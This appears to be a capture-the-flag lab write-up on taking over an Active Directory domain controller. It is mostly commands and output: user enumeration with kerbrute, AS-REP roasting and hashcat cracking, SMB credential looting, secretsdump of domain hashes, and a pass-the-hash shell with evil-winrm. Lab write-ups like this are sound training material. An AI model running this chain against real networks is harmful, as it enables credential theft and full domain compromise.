53/tcp open domain syn-ack ttl 125  
80/tcp open http syn-ack ttl 125  
88/tcp open kerberos-sec syn-ack ttl 125  
135/tcp open msrpc syn-ack ttl 125  
139/tcp open netbios-ssn syn-ack ttl 125  
389/tcp open ldap syn-ack ttl 125  
445/tcp open microsoft-ds syn-ack ttl 125  
464/tcp open kpasswd5 syn-ack ttl 125  
593/tcp open http-rpc-epmap syn-ack ttl 125  
636/tcp open ldapssl syn-ack ttl 125  
3268/tcp open globalcatLDAP syn-ack ttl 125  
3269/tcp open globalcatLDAPssl syn-ack ttl 125  
3389/tcp open ms-wbt-server syn-ack ttl 125  
5985/tcp open wsman syn-ack ttl 125  
9389/tcp open adws syn-ack ttl 125  
47001/tcp open winrm syn-ack ttl 125
 
**enumerate the smb ports:**  
enum4linux -a -U 10.10.135.118
 
Found dns domin name in nmap results: spookysec.local
 
**# add target to /etc/hosts bc we are working in internal network and kerbrute needs to be able to # find the domain controller:**  
# echo 10.10.135.118 spookysec.local >> /etc/hosts
 
A whole host of other services are running, including Kerberos. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!  
**use kerbrute to brute usernames:**  
./kerbrute userenum -d spookysec.local --dc spookysec.local /user.txt  
kerbrute -domain spookysec.local -users names.txt  
…  
svc-admin  
backup  
…
 
After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting**. ASReproasting occurs when a user account has the privilege "**Does not require Pre-Authentication**" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
 
Retrieving Kerberos Tickets
 
**Impacket** has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.  
Remember: Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with python3.9 /opt/impacket/examples/GetNPUsers.py.
 
python3 /opt/impacket/examples/GetNPUsers.py -usersfile user.txt spookysec.local/svc-admin -no-pas
 
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:44b6b0bc3286dcc2aba74fb638200966$63a7748df8c9ba669be1ee36de40b5eba5afd6f7143edac987aa551bf0478785910fd88f5249ff98fbb7c902b6a25c752a82ebba94053aca18e193cc8654f2f27255bda5fd1ceb53953a7b6651af07511b1a836d131757acf8d5cd9791c574c90411c4b86a48817c574897519dce1b0284cc2d5df0919a1542595f30261497483c87a754dc7fecd2ff37f0f32f0d3e30aba3d23210350f689b19262793349e6358c7b6a3bd4131e9e101b86acc223a8594d81a1aa526316acaaecac0e5a22040393892a2b43c9efa962d9dddab63e2b8ee1d097b3ce40d4454a76dbba01e599f6be0533b537c2596e2f4688ea7284688675b
 
^Kerberos 5, etype 23, AS-REP - hashcat
 
hashcat -a 0 -m 18200 hash.txt pass.txt
 
**svc-admin:management2005**
 
**Search for SMB shares:**  
smbclient -L 10.10.135.118 -U svc-admin
 
smbclient //10.10.135.118/backup -U svc-admin (pass: management2005)  
more backup_credentials.txt
 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw  
**cyberchef:**  
**backup@spookysec.local:backup2517860**
 
**use impacket secretsdump.py with new account to grab pass hashes:**  
python3 /opt/impacket/examples/secretsdump.py -just-dc backup@10.10.135.118
 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
**Administrator**:500:aad3b435b51404eeaad3b435b51404ee:**0e0363213e37b94221497260b0bcb4fc**:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48  
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae  
Administrator:des-cbc-md5:2079ce0e5df189ad
 
**Administrator:ntlm{0e0363213e37b94221497260b0bcb4fc}**
 
**To get Admin shell:**  
/usr/bin/evil-winrm -i 10.10.135.118 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
   

**LL:**  
Using kurberos to bruteforce smb users and see if they can request kerberos auth ticket without identification  
Using impacket to request kerberos ticket (GetNPUsers.py)  
hashcat kerberos ticket  
use smbclient to search for shares  
Using impacket to grab passw hashes from user "backup" bc it is backup of Active Directory so when AD updates, backup also updates. (secretsdump.py)  
login to shell with evil-winrm Administrator and ntlm hash